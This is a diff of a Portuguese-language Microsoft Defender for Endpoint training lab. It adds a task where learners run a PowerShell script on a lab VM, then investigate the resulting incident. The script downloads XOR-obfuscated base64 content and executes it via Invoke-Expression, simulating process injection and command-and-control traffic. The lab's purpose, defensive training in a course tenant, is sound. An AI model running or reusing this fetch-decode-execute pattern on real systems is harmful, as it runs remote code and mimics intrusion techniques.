@@ -40,20 +40,6 @@ Nesta tarefa, você confirmará se o dispositivo foi integrado com êxito e cria
 
     >**Observação:** A janela é fechada automaticamente depois de executar o script com êxito e, após alguns minutos, os alertas são gerados no portal do Microsoft Defender XDR.
 
-<!--- ### Task 2: Simulated Attacks
-
->**Note:** The Evaluation lab and the Tutorials & simulations section of the portal is no longer available. Please refer to the **[interactive lab simulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** for a demonstration of the simulated attacks.
-
-1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
-
-1. Select the **Tutorials** tab.
-
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
-
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button.
-
-    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
-
 ### Tarefa 2: Investigar alertas e incidentes
 
 Nesta tarefa, você investigará os alertas e incidentes gerados pelo script de teste de detecção de integração na tarefa anterior.
@@ -84,6 +70,46 @@ Nesta tarefa, você investigará os alertas e incidentes gerados pelo script de 
 
 1. Analise o conteúdo das guias *História de ataque, Alertas, Ativos, Investigações, Evidência e resposta* e *Resumo*. Os dispositivos e usuários se encontram na guia *Ativos*. Em um incidente real, a guia *História de ataque* exibe o *Grafo do incidente*. **Dica:** Algumas guias podem estar ocultas devido ao tamanho da exibição. Selecione a guia de reticências (...) para que elas apareçam.
 
-<!---    >**Warning:** The simulated attacks here are an excellent source of learning through practice. Only perform the attacks in the instructions provided for this lab when using the course provided Azure tenant.  You may perform other simulated attacks *after* this training course is complete with this tenant. --->
+### Tarefa 3 Simular um ataque
+
+>**Aviso**: Esse ataque simulado é uma excelente fonte de aprendizado por meio da prática. Execute apenas os ataques nas instruções fornecidas para este laboratório ao usar o locatário do Azure fornecido pelo curso.  Você pode executar outros ataques simulados *após* este curso de treinamento ser concluído com esse locatário.
+
+Nesta tarefa, você simulará um ataque à máquina virtual WIN1 e verificará se o ataque foi detectado e mitigado pelo Microsoft Defender para Ponto de Extremidade.
+
+1. Na máquina virtual WIN1, *clique com o botão direito do mouse* o botão **Iniciar** e escolha **Windows PowerShell (Administrador)**.
+
+1. Quando a janela "Controle de conta de usuário" for exibida, selecione **Sim** para permitir que o aplicativo seja executado.
+
+1. Copie e cole o script de simulação a seguir na janela do PowerShell e pressione **Enter** para executá-lo:
+
+    ```PowerShell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
+    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+
+    >**Observação:** Se ocorrerem erros (em vermelho) durante a execução do script, abra o aplicativo Bloco de Notas e copie o script em um arquivo em branco. Certifique-se de que a *quebra automática de linha* esteja ativada no Bloco de Notas. Copie e execute cada linha do script separadamente no PowerShell.
+
+1. O script produzirá várias linhas de saída e uma mensagem informando que ele *Falhou ao resolver controladores de domínio no domínio*. Alguns segundos depois, o aplicativo *Bloco de Notas* será aberto. Um código de ataque simulado será injetado no Bloco de Notas. Mantenha a instância do Bloco de Notas gerada automaticamente aberta para experimentar o cenário completo. O código de ataque simulado tentará se comunicar com um endereço IP externo (simulando um servidor C2).
+
+### Tarefa 4: Investigar o ataque simulado como um único incidente
+
+1. No portal do Microsoft Defender XDR, selecione **Incidentes e alertas** na barra de menus à esquerda e selecione **Incidentes**
+
+1. Um novo incidente chamado *Incidente de vários estágios envolvendo evasão de defesa e descoberta em um ponto de extremidade* está no painel direito. Selecione o nome do incidente para carregar seus detalhes.
+
+1. Na guia *Histórico do ataque*, recolha os painéis de **Alertas** e **Detalhes do incidente** para exibir o **Grafo de incidentes** completo.
+
+1. Passe o mouse e selecione os **Nós do Grafo de incidentes** para revisar as *entidades*.
+
+1. Expanda novamente o painel de **Alertas** (lado esquerdo) e selecione o ícone **Executar histórico de ataque** *Executar*. Isso mostra o alerta da linha do tempo de ataque por alerta e preenche dinamicamente o *Grafo de incidentes*.
+
+1. Analise o conteúdo das guias *História de ataque, Alertas, Ativos, Investigações, Evidência e resposta* e *Resumo*. Os dispositivos e usuários se encontram na guia *Ativos*. **Dica:** Algumas guias podem estar ocultas devido ao tamanho da exibição. Selecione a guia de reticências (...) para que elas apareçam.
+
+1. Na guia **Evidência e resposta**, selecione **Endereços IP**, em seguida, selecione o *Endereço IP*. Na janela pop-up, revise os detalhes do endereço IP, role para baixo e selecione o botão **Abrir página de endereço IP**.
+
+1. Revise o conteúdo da página *Endereço IP*das guias *Visão geral, incidentes e alertas e Observados em organizações*. Algumas guias podem não conter informações para o endereço IP.
 
 ## Você concluiu o laboratório
